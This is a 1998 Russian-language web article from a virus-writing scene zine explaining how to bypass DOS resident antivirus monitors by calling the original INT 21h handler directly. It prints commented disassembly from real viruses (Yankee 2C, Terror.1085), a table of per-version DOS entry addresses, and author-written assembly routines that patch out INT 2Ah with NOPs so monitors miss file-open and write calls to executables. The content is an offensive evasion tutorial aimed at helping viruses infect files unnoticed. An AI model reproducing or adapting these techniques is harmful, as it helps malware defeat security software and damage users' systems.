<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">

<html>
<head>
<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=utf-8">
 <title>TopSpeed Compilers</title>
<style type="text/css">
   BODY {font-family:Arial; font-size:10pt; margin-left:10;margin-right:10} 
   TD {font-family:Arial; font-size:10pt}
   P {font-family:Arial; font-size:10pt; text-align:justify}
   LI {font-family:Arial; font-size:10pt}
   UL {font-family:Arial; font-size:10pt}   
   PRE {font-family:Tahoma; font-size:10pt}
   STRONG  {font-family:Arial; font-size:10pt}
   CENTER {font-family:Arial; font-size:10pt}
</style>    
</head>

<body>
<table align="center" width="100%" cellspacing="0" cellpadding="0" border="0">
<tr>
    <td width="15%" height="25" bgcolor="teal"></td>
    <td width="70%" height="25" bgcolor="teal"></td>
    <td width="15%" height="25" bgcolor="teal"></td>
</tr>
<tr>
    <td width="15%" height="50"></td>
    <td width="70%" height="50" align="center"><b><font face="arial black" size="+4" color="Teal">DRMADСКОЕ БАРАХЛО</font></b></td>
    <td width="15%" height="50"></td>
</tr>
<tr>
    <td width="15%" height="25" bgcolor="teal"></td>
    <td width="70%" height="25" bgcolor="teal"></td>
    <td width="15%" height="25" bgcolor="teal"></td>
</tr>
<tr>
    <td width="15%" height="25" bgcolor="#60C0C0"></td>
    <td width="70%" height="25" bgcolor="#60C0C0"></td>
    <td width="15%" height="25" bgcolor="#60C0C0"></td>
</tr>
<tr>
    <td width="15%" height="100%" bgcolor="#60C0C0"></td>
    <td width="70%" height="100%">
    
    <table border="0" bordercolor="teal" width="100%" height="100%" cellpadding="10">
    <tr>
    <td>
    
    <!--->  

<TABLE ALIGN=CENTER CELLPADDING=5 BGCOLOR="Teal" WIDTH="100%">
<TR>
<TH>
<FONT SIZE=+2 COLOR="White">
ОБХОД РЕЗИДЕНТНЫХ АНТИВИРУСНЫХ МОНИТОРОВ<br>
ПРЯМЫМ ОБРАЩЕНИЕМ К ДОС (MoonBug #5)
</FONT>
</TH>
</tr>
</TABLE>

<br><a href="index.html"><img src="back.gif"></a></br>
<p>
<a href="#m0">ВВЕДЕНИЕ</a><br>
<a href="#m1">1. ОПРЕДЕЛЕНИЕ АДРЕСА ОРИГИНАЛЬНОГО ОБРАБОТЧИКА ДОС</a><br>
<a href="#m2">1.1. МЕТОД ТРАССИРОВКИ</a><br>
<a href="#m3">1.2. ЭКЗОТИЧЕСКИЕ МЕТОДЫ</a><br>
<a href="#m4">1.3. МЕТОД ПРЕДОПРЕДЕЛЕННЫХ АДРЕСОВ</a><br>
<a href="#m5">2. БОРЬБА С АНТИВИРУСНЫМИ МОНИТОРАМИ</a><br>
<a href="#m6">2.1. ОПИСАНИЕ РАБОТЫ АНТИВИРУСНОГО МОНИТОРА</a><br>
<a href="#m7">2.2. КОНСТРУИРОВАНИЕ НЕОТСЛЕЖИВАЕМОГО ОБРАЩЕНИЯ К ДОС</a><br>
<a href="#m8">2.3. ПРИМЕР РЕАЛИЗАЦИИ</a><br>
<a href="#m9">ЗАКЛЮЧЕНИЕ</a><br>
<a href="#m10">ЛИТЕРАТУРА</a><br>
</p>
<h2>
<a name="m0">ВВЕДЕНИЕ</a>
</h2>
<p>
    Обычно все  "нормальные"  программы  используют сервис ДОС
так:
</p>

<pre>
    mov  ah, ...
    int  21h
</pre>

<p>
    По команде   int  управление  передается  в  точку,  адрес
которой определяется двумя словами,  размещающимися в  таблице
векторов прерываний, начиная с адреса 0 : 84h. С этого момента
начинают  исполняться  многочисленные  команды  многочисленных
обработчиков  прерывания  int  21h  многочисленных резидентных
программ до тех пор,  пока управление,  наконец, не передается
оригинальному    обработчику,    принадлежащему   операционной
системе:
</p>

<pre>
    Программа -> Обраб. 1 -> Обраб. 2 ->...  -> Обраб. ДОС
</pre>

<p>
    Разумеется, среди этих многочисленных  обработчиков  может
затесаться обработчик, принадлежащий антивирусному монитору. А
это,  блин,  такой  мерзкий  тип,  который  не  дает  спокойно
работать не только вирусам, но и подчас обычнымм программам.
</p>

<p>
    Поэтому "продвинутые" вирусы и некоторые "умные" программы
пытаются  определить   адрес   оригинального   обработчика   и
обратиться к нему напрямую, в обход остальных обработчиков:
</p>

<pre>
    Программа |  Обраб. 1 -> Обраб. 2 ->...  | -> Обраб. ДОС
              +­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­+
</pre>

<p>
    Делается это примерно так:
</p>

<pre>
    mov  ah, ...
    pushf
    call dword ptr O21
    ...
O21 dw   ?
S21 dw   ?
</pre>

<p>
     Но коварные    антивирусные    мониторы    учитывают   эту
возможность и предпринимают свои злодейские меры.
</p>

<h3>
<a name="m1">1. ОПРЕДЕЛЕНИЕ АДРЕСА ОРИГИНАЛЬНОГО ОБРАБОТЧИКА ДОС</a>
</h3>

<p>
    Для того,  чтобы  обратиться  к ДОС напрямую,  нужно знать
адрес оригинального обработчика.  Получить этот адрес  не  так
просто.
</p>

<h3>
<a name="m2">1.1. МЕТОД ТРАССИРОВКИ</a>
</h3>

<p>
    Чаще всего  используется  метод  трассировки  при   помощи
отладочного прерывания Int1.  Например, так поступал много лет
назад  вирус   Yankee   2C   (   M2C,   Музыкальный   ).   Вот
комментированый листинг соответствующего фрагмента:
</p>

<pre>
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; Дизассемблировано и комментировано (с) DrMad           ;;
;; ( не значимые для понимания фрагменты алгоритма        ;;
;; пропущены )                                            ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

................ [ порезано ] .............................

; Берем из таблицы векторов текущий адрес Int01
        mov   ax,3501
        int   21h
        mov   si,bx ; смещение сохраняем в si
        mov   di,es ; сегмент сохраняем в di

................ [ порезано ] .............................

; Устанавливаем свой обработчик Int01
        mov   ax,2501h
        mov   dx,offset Int01
        int   21h
; Формируем в стеке адреса выхода из трассировки
; так, чтобы по iret из 21h попаcсть сразу на Next

................ [ порезано ] .............................

        pushf         ; Флаги

................ [ порезано ] .............................

; К этому моменту ax = offset Next
        push  cs      ; Сегмент точки выхода
        push  ax      ; Смещение точки выхода (offset Next)
        cli
; Манипулируем с битом Т в регистре флагов
        pushf         ; Сохраняем флаги в стеке
        pop   ax      ; Выгружаем их в ax
        or    ax,100h ; Устанавливаем в ax бит Т
        push  ax      ; Сохраняем флаги с битом T=1 в стеке

................ [ порезано ] .............................

; Сейчас cs:ax содержит адрес текущего  обработчика Int21
        push  cs      ; Сегмент точки перехода
        push  ax      ; Смещение точки перехода
        iret          ; Фактически, Int21h
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;                     Обработчик Int01                   ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
Int01:
                      ; В этот момент в стеке:
                      ;  ss:[bp+6] флаги
                      ;  ss:[bp+4] cs
                      ;  ss:[bp+2] ip
        push  bp
                      ;  ss:[bp]   bp
        mov   bp,sp
;
        cmp   byte ptr cs:data_50e,1 ; Флаг продолжения = 1 ?
        je    loc_64                 ; Да - продолжаем
loc_63:                              ; Нет - кончаем
        and   word ptr [bp+6],0FEFFh ; В флагах бит T := 0
        mov   byte ptr cs:data_50e,0 ; Флаг продолжения := 0
        pop   bp
        iret                         ; Выходим из обработки
loc_64:
        cmp   word ptr [bp+4],300h ; cs в стеке < 300h ???
        jb    loc_65               ; Да - дошли до ДОС
        pop   bp                   ; Нет - трассируем далее
        iret                       ;
loc_65:
        push  bx
        mov   bx,[bp+2]            ; Берем из стека ip ДОС
        mov   cs:data_38e,bx       ; Сохраняем
        mov   bx,[bp+4]            ; Берем из стека cs ДОС
        mov   word ptr cs:data_38e+2,bx ; Сохраняем
        pop   bx
        jmp   short loc_63         ;
; Фрагмент восстановления из трассировки
Next:
        mov   byte ptr ds:data_50e,0 ; Флаг продолжения = 0
; Восстанавливаем прежнее значение Int01
        mov   ax,2501h
        mov   dx,si
        mov   ds,di
        int   21h
</pre>

<p>
    В настоящее  время  этот  алгоритм можно считать несколько
устаревшим.  Дело в  том,  что  современные  весии  ДОС  могут
размещать  свой обработчик в областях верхней памяти.  Поэтому
условие окончания трассировки должно выглядеть например так:
</p>

<pre>
        cmp   word ptr [bp+4],300h
        jb    loc_65
        cmp   word ptr [bp+4],0f000h
        ja    loc_65
</pre>

<p>
Как вариант,  возможно  использование  следующего  приема.
Сначала  определяется  "родной"   сегмент   ДОС   при   помощи
недокументированной  функции  52h  (  возвращает адрес List of
Lists ):
</p>

<pre>
        mov   ah, 52h
        int   21h
        mov   SegDOS, es
</pre>

<p>
Тогда условие  завершения   трассировки   можно   оформить
следующим образом:
</p>

<pre>
        push  ax
        mov   ax, cs: SegDOS
        cmp   word ptr [bp+6], ax
        pop   ax
        jz    loc_65
</pre>

<p>
Разумеется, разные  приемы  могуть дать разные результаты.
Причем все результаты  можно  считать  в  той  или  иной  мере
"правильными".  Дело в том,  что современные версии ДОС,  даже
будучи загружены в верхнюю память,  всегда имеют точку входа в
нижней памяти вида:
</p>

<pre>
        nop
        nop
        call  Check_A20            ; Проверка адресной линии
        jmp   cs: dword ptr HI_DOS ; Переход в верхнюю память
</pre>

<p>
С точки  зрения  обхода   резидентных   мониторов   "самым
правильным" следует признать адрес в обработчике ДОС,  имеющий
максимальное значение.  Мы еще вернемся к вопросу о нахождении
"правильного адреса" далее.
</p>

<p>
Авторы антивирусных  мониторов  знают  о  подобном  приеме
поиска оригинального  адреса  ДОС.  Достаточно  легко  обломит
трассировку,  например,  вот такой вот фрагмент,  встроенный в
цепочку обработчиков (идея Ю. Косивцова) :
</p>


<pre>
        pop   ss    ; Сбивает трассировку на 1 шаг !
        int   60h
        nop         ; Сюда должно вернуться прерывание
        nop         ; Сюда оно реально вернется,
                    ; и флаг трассировки будет сброшен
        ........
Int60:
        sti
        push  bp
        mov   bp, sp
        add   [bp+2], 1 ; Изменяем в стеке адрес возврата
        pop   bp
        retf  2
</pre>

<p>
    Кроме того,  факт  трассировки  можно  достаточно   просто
обнаружить,  использовав  хорошо известный разработчикам защит
от   несанкционированного   копирования   прием    аппаратного
конвейера:
</p>

<pre>
        mov   Metka, 9090h
Metka:  jmp   NoTrace
Trace:
        ........
NoTrace:
        ........
</pre>

<p>
    Наконец, тот же Ю.  Косивцов забивает последний  гвоздь  в
гроб идеи использовать трассировку:
</p>

<blockquote>
    "Выставленный флаг  трассировки  можно  выявить  косвенно,
замаскировав  аппаратные   прерывания,   поместив   в   [SP-1]
контрольное значение и дав инструкцию STI.  Тогда по изменению
слова в стеке можно судить, было трассировочное прерывание или
нет."
</blockquote>

<p>
    Выявив факт  трассировки  ДОСовского прерывания,  мониторы
начинают кричать,  вопить,  брызгать слюнями... короче, только
самый тупой юзырь не догадается,  что кто-то (например, вирус)
пытается залезть в систему.
</p>

<h3>
<a name="m3">1.2. ЭКЗОТИЧЕСКИЕ МЕТОДЫ</a>
</h3>

<p>
    Таких методов немало,  но все они сопряжены с техническими
трудностями.  Тем не менее, кратко остановимся на некоторых из
них.
</p>

<p>
И. Данилов ( файл virlist.web ):
</p>

<blockquote>
  "MTZ.PinkPanther.4510, MTZ.PinkPanther.5081.         Очень
остроумно  определяют  оригинальный адрес обработчика INT 21h,
перехватив  INT  6  и   "забив"   ядро   DOS   байтами   0FFh,
предварительно скопировав данное ядро в область UMB."
</blockquote>

<p>
    Поясним, что  INT  6  автоматически вызывается при попытке
процессора выполнить "нестандартную" команду.  Перехватив  это
прерывание, вирус извлекает из стека адрес (CS и IP) той точки
памяти,  которая раньше принадлежала ДОС и куда  в  результате
передалось управление. А ДОС "временно вышел погулять". ;-)
</p>

<p>
    Возможна модификация этой идеи, заключающаяся в следующем:
область ДОС-памяти забивается не кодом 0FF,  а кодом 0CC ( это
однобайтовый  вариант  команды  IТЕ 3 ).  Перехватывать в этом
случае нужно именно 3-е прерывание, а дальше все аналогично.
</p>

<p>
    Интересный прием поиска оригинального адреса Int21 родился
в  результате  проводимого  в  1994  году на страницах журнала
"Монитор" конкурса короткого кода.  Он  основан  на  следующем
факте:  недалеко  от точки входа в оригинальный обработчик ДОС
находится вызов прерывания 2A (байты CD  2A).  Зная  структуру
начала оригинального обработчика, ( например, то, что недалеко
от точки входа имеются команды mov ah,  cl / jmp short xxxx ),
можно найти эту точку входа. Фрагмент поиска:
</p>

<pre>
      mov   ah, 52h                   ; Возвращает адрес
      int   21h                       ; List Of Lists
      mov   bx, word ptr cs:[bx+4]
      lds   bx, dword ptr es:[bx-4]
LoopF:
      dec   bx
      cmp   word ptr ds:[bx-4], 0E18Ah
      jne   LoopF
</pre>

<p>
    Вопрос из  зала:  а  в МСДОС версии 7 работать будет?  А в
ДРДОС? А в Физтех-ДОС ? Ответ - не знаю, проверьте !
</p>

<h3>
<a name="m4">1.3. МЕТОД ПРЕДОПРЕДЕЛЕННЫХ АДРЕСОВ</a>
</h3>

<p>
    И тут  мы  переходим  к  методу  определения оригинального
адреса точки входа в ДОС,  основанному на том,  что эти адреса
для  разных  версий  и  конфигураций  ДОС имеют в общем случае
различные значения, но число их ограничено.
</p>

<p>
    А это значит,  что их можно просто-напросто выбирать из не
особенно большой таблицы - voila!
</p>

<p>
    Прием также  не  новый,  но  незаслуженно забытый.  Пример
(вирус Terror.1085):
</p>

<pre>
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; Дизассемблировано и комментировано (с) DrMad           ;;
;; ( не значимые для понимания фрагменты алгоритма        ;;
;; пропущены )                                            ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
d_108   dw      17D0h
............ [ порезано ] ............................
d_10C   dw      0F7Ah
............ [ порезано ] ............................
loc_7:
        mov  ah,30h   ; Запросить  код
        int  21h      ; версии ДОС
        mov  bx,102h
        cmp  ax,0A03h ; Это 3.10 ?
        jne  loc_8    ; Нет - идем дальше
        mov  ax,70h   ; Сегмент = 70h
        mov  bx,0D43h ; Смещение = 0D43h
        mov  es,ax
        cmp  byte ptr es:[bx],2Eh ; Правильный байт = 2Eh ?
        jne  loc_9                ; Нет - значит а/в монитор
        mov  ax,bx                ;
        jmp  short loc_10         ; На заполнение адреса
loc_8:
        add  bx,4
        cmp  ax,1403h ; Это 3.20 ?
        je   loc_9    ; Да - на loc_9
        add  bx,4     ; Нет - идем дальше
        cmp  ax,1E03h ; Это 3.30 ?
        je   loc_9    ; Да - на loc_9
                      ; Нет - фрагмент возмездия :-(((
............... [ порезано ] ............................
loc_9:
        mov  ax,cs:[bx+2] ; Смещение точки входа из таблицы
                          ; cs:108h или cs:10Ch
loc_10:
        mov  dx,cs:[bx]
        mov  cs:data_18,ax  ; Смещение
        mov  cs:data_19,70h ; Сегмент = 70h
</pre>

<p>
    Имея программу,  основанную  на  одном  из ранее описанных
способов  определения  реального   адреса   обработчика   ДОС,
загрузочные   дискеты   с  разными  версиями  ДОС  и  немножко
терпения, можно получить примерно вот такую информацию.
</p>

<p>
    Оригинальный обработчик ДОС версии 3.30 всегда  имеет вид:
</p>

<pre>
     2E            CS:           ; <- Точка 0
     891EB800      MOV [00B8],BX ;
     2E            CS:           ;
     8C06BA00      MOV [00BA],ES ;
     CB            RETF          ;
     ...............................

     2E        CS:               ; <- Точка 1
     3A26FF0D  CMP     AH,[0DFF] ; Проверка на max
     77DC      JA      1443      ;
     80FC51    CMP     AH,51     ;
     74A1      JZ      140D      ;
     .......................     ;
     80FC64    CMP     AH,64     ;
     74BA      JZ      143A      ;
                                 ; <- Точка 2
</pre>

<p>
    Оригинальные обработчики   ДОС  версий  5.0  -  7.0  очень
похожи. В общем случае они состоят из следующих фрагментов:
</p>

<p>
    Фрагмент 1 (если он присутствует) всегда  располагается  в
нижних  адресах  памяти.  Большинство  алгоритмов  трассировки
заканчивают работу, достигнув этой точки. Для ДОС версий 5.0 -
6.22  этот  фрагмент  имеется,  если в CONFIG.SYS присутствует
строка DOS=HIGH  вне  зависимости  от  того,  наличествует  ли
запуск  поддерживающего  эту  опцию  драйвера HIMEM.SYS.  Если
драйвера нет,  то JMP FAR  просто  указывает  на  фрагмент  2,
размещающийся  в нижних областях памяти.  Если строки DOS=HIGH
нет,  то  фрагмент  1  вырожден  (состоит  из  одной   команды
внутрисегментного перехода), и обработчик состоит из фрагмента
2.
</p>

<pre>
     90        NOP                 ; <- Точка 0
     90        NOP                 ;
     E8CC00    CALL    CheckA20    ;
     2E        CS:                 ;
     FF2E6A10  JMP     FAR NEXTDOS ;
</pre>

<p>
    Фрагмент 2 может располагаться как  в  верхних,  так  и  в
нижних адресах памяти (см. выше).
</p>

<pre>
NEXTDOS:
     FA        CLI                 ; <- Точка 1
     80FC6C    CMP     AH,6C       ; Проверка на Max
     77D2      JA      40D0        ;
     ......................        ;
     80FC50    CMP     AH,50       ;
     748E      JZ      40A9        ;
                                   ; <- Точка 2
</pre>

<p>
    Для ДОС 7.0 структура обработчика  в-общем  такая  же,  за
исключением  того,  что  фрагмент  1 присутствует всегда,  вне
зависимости от содержимого файла CONFIG.SYS.  По крайней мере,
автору  не  удалось  принудительно  загрузить ДОС 7.0 в нижние
области памяти.
</p>

<p>
    Теперь приведем конкретные  значения  адресов,  полученные
для разных случаев (2 раза проверял, но в правильности адресов
все еще не уверен):
</p>

<pre>
                   ДОС 7.0 (русская версия)

                   Точка 0  00C9:0FB2 9090
                   Точка 1  FF03:41E7 80FA
                   Точка 2  FF03:420A 1E06
                   Точка 2А FF03:5333 2ACD

                           ДОС 6.20
                       device=himem.sys
                           dos=high

                   Точка 0  0123:109E 9090
                   Точка 1  FDC8:40F8 80FA
                   Точка 2  FDC8:411B 1E06
                   Точка 2A FDC8:41D1 2ACD

                           ДОС 6.20
                           dos=high

                   Точка 0  0123:109E 03EB
                   Точка 1  03AC:40F8 80FA
                   Точка 2  03AC:411B 1E06
                   Точка 2A 03AC:41D1 2ACD

                           ДОС 6.20

                   Точка 1  002A:40F8 80FA
                   Точка 2  002A:411B 1E06
                   Точка 2A 002A:41D1 2ACD

                           ДОС 5.0
                       device=himem.sys
                           dos=high

                   Точка 0  0123:109E 9090
                   Точка 1  FDC8:40EB 80FA
                   Точка 2  FDC8:410E 1E06
                   Точка 2A FDC8:41C4 2ACD

                           ДОС 5.0
                           dos=high

                   Точка 0  0123:109E 03EB
                   Точка 1  03AC:40F8 80FA
                   Точка 2  03AC:411B 1E06
                   Точка 2A 03AC:41D1 2ACD

                           ДОС 5.0

                   Точка 1  002A:40EB 80FA
                   Точка 2  002A:410E 1E06
                   Точка 2A 002A:41D1 2ACD

                           ДОС 3.30

                   Точка 0  0070:05DC 892E (0F7A ???)
                   Точка 1  0294:1460 3A2E
                   Точка 2  0294:1480
                   Точка 2A 0294:151B 2ACD

                           ДОС 3.10 (см. Террор)

                   Точка 0  0070:0D43

                           ДОС 3.20 (см. Террор)

                   Точка 0  0070:17D0
</pre>

<p>
    Точка 2 - это "оптимальная точка",  т.е.  точка, в которую
целесообразней  всего  передавать  управление  с  целью обхода
резидентных антивирусных мониторов.  Точка 2A  -  это  позиция
команды INT 2Ah,  которую ДОС обязательно выполняет в процессе
обработки 21-го прерывания (пригодится нам позже).
</p>

<p>
    В конце каждой строки приведены "контрольные" слова на тот
случай, если по указанному адресу находится нечто иное.
</p>

<h3>
<a name="m5">2. БОРЬБА С АНТИВИРУСНЫМИ МОНИТОРАМИ</a>
</h3>

<p>
    К сожалению,   современные   антивирусные  мониторы  умеют
отслеживать факт прямого обращения программы с ДОС.
</p>

<h3>
<a name="m6">2.1. ОПИСАНИЕ РАБОТЫ АНТИВИРУСНОГО МОНИТОРА</a>
</h3>

<p>
    Ю. Косивцов:
<p>

<blockquote>
"Однако  защиту   21-го   прерывания   можно
организовать  более эффективно,  используя метод встраивания в
ядро операционной системы.  Обычно это делается  по  следующей
схеме:  в  точку входа INT 21h записывается инструкция JMP FAR
для   обработчика,   кторый   проверяет   номер   функции   на
безопасность, потом восстанавливает на нее точку входа INT 21h
и делает CALL FAR на нее.  После возврата управления  в  точку
входа  ДОС  опять записывается инструкция JMP FAR и управление
передается программе, которая вызвала INT 21h."
</blockquote>

<p>
    Здесь по  сути  дела  описан  обычный  сплайсинг,  который
широко применяется в узких вирмерских кругах. :-) Отметим, что
для перехода не обязательно использовать  JMP  FAR  (  который
занимает  5 байтов в памяти и не всюду его можно воткнуть),  а
например,  можно просто INT 3,  который занимает всего 1 байт.
Зато  непременно требуется обработка вызовов с кодами 0,  4Ch,
31h ( которые не возвращают управление в исходную точку  ),  а
так  же самовызовов ( при завершении процессов посредством INT
27h и INT 20h).  Пример использования сплайсинга можно найти в
1-м выпуске электронного журнала Infected Voice.  К сожалению,
это описание также страдает неполнотой.
</p>

<p>
    Продолжаем следить  за  мыслью   Ю.   Косивцова:
</p>

<blockquote>
"Первый
компонент [антивирусного монитора] встраивается в ядро ДОС,  а
второй просто перехватывает цепочку  21-го  прерывания.  Когда
програма  выполняет инструкцию INT 21h,  управление передается
второму компоненту.  Он может сделать  проверки  на  опасность
функции,   затем   выставить  переменную  "проход  цепочки"  и
передать управление дальше.  При получении  управления  первым
компонентом  он  проверяет переменную "прохода цепочки".  Если
она выставлена,  то была инструкция  INT  21h,  надо  сбросить
переменную  "проход  цепочки" и передать управление ДОС.  Если
переменная сброшена, то вызов пришел напрямую и надо принимать
меры: скорее всего, это действие вируса."
</blockquote>

<p>
    Эта идея  настолько  проста и эффективна,  что ее варианты
используют   почти   все   (известные   автору)    более-менее
продвинутые антивирусные мониторы. Пример ( по LovinGOD'у ):
</p>

<blockquote>
    "Оттрассировав DOS,  я  обратился  к  DOS по оригинальному
адресу.  AVPTSR  перехватил  обращение.  В  чем  дело?  AVPTSR
перехватывает  INT 2Ah,  которое обязательно вызывается из INT
21h (совсем недалеко от начала)...  Обработчик INT 8,  то есть
таймера, периодически восстанавливает вектор 2Ah , если кто-то
его отрубил."
</blockquote>

<p>
    Имеется в  виду,  что   флажок   прохода   цепочки   21-го
прерывания проверяется в обработчике INT 2A.
</p>

<h3>
<a name="m7">2.2. КОНСТРУИРОВАНИЕ НЕОТСЛЕЖИВАЕМОГО ОБРАЩЕНИЯ К ДОС</a>
</h3>

<p>
    Сначала ответим  сами  себе на вопрос:  а нафига?  Неужели
антивирусные мониторы настолько "бЗдительны",  что  сводят  на
нет  любые  попытки,  например,  открыть  на  запись  EXE- или
СОМ-файл? Да, это так и есть.
</p>

<p>
    Итак, мы можем видеть,  что авторы антивирусных  мониторов
имеют  достаточно  эффективных  средств,  чтобы  предотвратить
прямое обращения к ДОСу со стороны вирусов.
</p>

<p>
    Снова дадим слово Ю.  Косивцову: "Для обнаружения действия
нерезидентных  вирусов необходимо контролировать вызов функций
ДОС с номерами:  3Dh - открытие файла через  описатель,  0F  -
открытие файла через FCB и 5Dh, подфункция 0 - косвенный вызов
ДОС.  Если при открытии файла обнаружено,  что расширение  его
СОМ,   ЕХЕ   или   SYS,   то  можно  выдавать  предупреждающее
сообщение."
</p>

<p>
    Список выглядит слишком коротким. Действительно, а если мы
сперва  переименуем  программный  файл?  А  почему  не  учтена
функция 6Ch (Расширенное Открытие Файла)? А что будет, если мы
откроем  файл на чтение,  а потом изменим режим доступа прямым
обращением к SFT?
</p>

<p>
    Не надо считать авторов антивирусных мониторов  совсем  уж
тупыми.   Просто   они   никогда   не   открывают  всех  своих
профессиональных секретов.  Например, AVPTSR прекрасно знает и
учитывает вышеперечисленные хитрости.
</p>

<p>
    Итак, "заложимся   на  пятого  туза"  и  предположим,  что
гипотетический антивирусный супермонитор:
</p>

<ul>
<li>отслеживает  и  блокирует  попытки  оттрассировать  21-е
прерывание;
<li>для контроля "опасных" номеров  функций  ДОС  использует
сплайсинг и встраивается в начало обработчика ДОС;
<li>для предотвращения прямого обращения  к  ДОС  использует
флажок,  сбрасываемый либо во "врезанном фрагменте", либо (что
более круто) в обработчике прерывания 2А.
</ul>

<p>
    Первая проблема    достаточно    просто     решается     с
использованием "метода предопределенных адресов".
</p>

<p>
    Для решения   второй   проблемы  проанализируем  возможное
местоположение   в   обработчике   ДОС   точки   перехода   на
антивирусный монитор.  Из самых простых рассуждений видно, что
это может быть точка 0, либо точка 1. Как самый крутой вариант
можно   предположить,   что   врезка   происходит   в   точку,
непосредственно следующую за командой "Проверка на Max". Далее
обработчик ДОС растекается на многочисленные ручейки,  поэтому
автор антивирусного монитора врядли решится отслеживать их все
по отдельности.  По крайней мере, обработчики функций 0Fh, 3Dh
и 5Fh располагаются в разных ручейках. Но нам может помочь тот
факт,  что мы будем использовать ограниченный набор функций, и
желательно,  чтобы все они размещались в одном ручейке.  И - о
удача!    -    функции    3Сh    -    43h,    отвечающие    за
создание-открытие-закрытие-чтение-запись-атрибуты-перемещение
действительно  располагаются  в одном общем - главном ручейке.
Это дает нам возможность использовать в  качестве  адреса  для
прямого обращения к ДОС - адрес точки 2.  Сюда-то монитор хрен
доберется! :-)
</p>

<p>
    Третья проблема также  не  вызывает  трудностей.  LovinGod
предлагает  замаскировать прерывания таймера и изменить вектор
8-го  прерывания  перед  прямым  обращением  к   ДОС.   Вместо
изменения вектора можно попробовать также вставку команды IRET
в  начало  текущего   (антивирусного)   обработчика.   Мы   же
попытаемся  использовать  все  тот  же метод "предопределенных
адресов".  Зная положение команды INT 2Ah в  обработчике  ДОС,
перед прямым обращением к ДОС просто "забъем" этот вызов двумя
командами NOP.
</p>

<h3>
<a name="m8">2.3. ПРИМЕР РЕАЛИЗАЦИИ</a>
</h3>

<p>
    Реализуем две    подпрограммы,    которые    могут    быть
использованы для прямого обращения к ДОС.
</p>

<p>
    Подпрограмма SetAdr   предназначена   определения   адреса
обработчика ДОС методом предопределенных адресов.  Для  версий
ДОС,  для которых "правильный адрес" неизвестен,  используется
стандартный способ определения адреса.
</p>

<p>
    Подпрограмма CallDOS предназначена для прямого обращения к
ДОС. Дабы  не возникало соблазна использовать эту подпрограмму
для вызова "безопасных" функций,  в код включена  проверка  на
номер функции.  Для  "безопасных" функций предусмотрен обычный
вызов ДОС при помощи команды INT 21h.
</p>

<pre>
    ;
    ; Процедура установки адреса
    ; (Один из самых коротких, хотя и подозрительных
    ; вариантов реализации)
    ;
    SetAdr proc near
           mov  si, offset Table
           mov  es, [si]
           mov  bx, [si+2]
    Next:
           cmp  es:[bx], 2ACDh
           jnz  Skip
           mov  Ofs2A, bx
           mov  Seg2A, es
           mov  ax, [bx+3]
           mov  Seg21, ax
           mov  ax, [bx+4]
           mov  Ofs21, ax
    Skip:
           add  bx, 4
           cmp  [bx], 0
           jnz  Next
    ;
           mov  ax, 3521h
           int  21h
           mov  Ofs21, bx
           mov  Seg21, es
    Done:
           ret
    ;           Позиция Int2A  Оптимальная точка
    Table  dw   0FF03h, 5333h, 0FF03h, 420Ah
           dw   0FDC8h, 41D1h, 0FDC8h, 411Bh
           .................................
           dw   0
    SetAdr endp
    ;
    ; Процедура прямого обращения к ДОС
    ;
    CallDOS proc near
           cmp  ah, 3Bh
           jb   Trivial
           cmp  ah, 42h
           ja   Trivial
    ; Убиваем вызов 2А
           push es
           push ax
           push bx
           mov  es, cs:Ofs2Ah
           mov  bx, cs:Seg2Ah
           mov  ax, es:[bx]
           mov  cs: Save, ax
           mov  es:[bx], 9090h
           pop  bx
           pop  ax
           pop  es
    ; Обращаемся к ДОС
           pushf
           call cs:dword ptr Ofs21
    ; Восстанавливаем вызов 2А
           push es
           push ax
           push bx
           mov  es, cs: Ofs2Ah
           mov  bx, cs: Seg2Ah
           mov  ax, cs: Save
           mov  es:[bx], ax
           pop  bx
           pop  ax
           pop  es
    ;
           ret
    ; Обычное обращение к ДОС
    Trivial:
           int  21h
           ret
    ;
    Save   dw   ?
    Ofs21  dw   ?
    Seg21  dw   ?
    Ofs2A  dw   ?
    Seg2A  dw   ?
    ;
    CallDOS endp
</pre>

<h3>
<a name="m9">ЗАКЛЮЧЕНИЕ</a>
</h3>

<p>
    Вдумчивый читатель спросит:  нафига так длинно?  А  адреса
правильные? А почему процедуры так дубово написаны?
</p>

<p>
    Отвечу: дык,  основная  цель  этой  статьи  -  пробудить у
читателя интерес.  Чтобы ему,  бездельнику этакому, захотелось
проверить результаты и использовать их.
</p>

<p>
    Поэтому, если  обнаружите неточность или ошибку - считайте,
что статья своей цели достигла. Вот вам уже и интересно... ;-)
</p>

<p>
(с) DrMad, 1998
</p>

<h3>
<a name="m10">ЛИТЕРАТУРА</a>
</h3>
<ol>
<li>    Ю.  Косивцов.  Двухкомпонентная   антивирусная   система.
// Монитор, 3/93 - 48-52.
<li>    Ю.  Косивцов.   Конструирование   антивирусного  сторожа.
// Монитор, 2/94  - С. 70-79.
<li>    LovinGOD. Описание AVP (Anti-Virus Pro) Касперского.
// Infected Voice #7.
<li>    IntMaster. Классический сплайсинг на примере INT 21h.
// Infected Voice #7.
<li>     И. Данилов. Virlist.VEB к DrWeb v3.27.
</ol>

<hr>
<p>
(с) Constantin E. Climentieff aka DrMad, 1998<br>
<a href="drmad%40dr.html">mailto:drmad@dr.com</a> 
<a href="http://www.chat.ru/~drmad">http://www.chat.ru/~drmad</a>
</p>


    </td>
    </tr>
    </table>
    </td>

    <td width="15%" height="100%" bgcolor="#60C0C0"></td>
</tr>
</table>

</body>
</html>

